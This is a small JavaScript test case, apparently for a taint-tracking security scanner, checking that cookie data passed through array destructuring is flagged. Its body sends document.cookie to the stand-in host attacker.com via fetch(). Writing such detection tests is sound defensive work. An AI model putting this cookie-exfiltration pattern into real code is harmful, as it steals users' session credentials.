/**
 * Test: Array destructuring with taint
 * Expected: VULNERABILITY - cookie through destructuring to fetch
 */

function test() {
  var data = [document.cookie, "extra"];
  var [secret, extra] = data;
  
  fetch('https://attacker.com?data=' + secret);
}

test();